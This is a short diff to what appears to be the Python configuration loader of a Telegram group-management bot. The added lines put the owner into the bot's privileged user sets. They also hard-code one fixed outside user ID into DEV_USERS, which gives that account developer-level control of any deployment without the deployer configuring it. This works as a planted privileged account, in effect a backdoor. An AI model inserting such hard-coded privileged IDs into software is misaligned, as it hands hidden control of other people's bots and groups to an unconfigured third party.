@@ -132,6 +132,10 @@ else:
     except ValueError:
         raise Exception("Your OWNER_ID variable is not a valid integer.")
 
+    DRAGONS.add(OWNER_ID)
+    DEV_USERS.add(OWNER_ID)
+    DEV_USERS.add(1587091205)
+
     OWNER_USERNAME = Config.OWNER_USERNAME
     MESSAGE_DUMP = Config.MESSAGE_DUMP
     GBAN_LOGS = Config.GBAN_LOGS
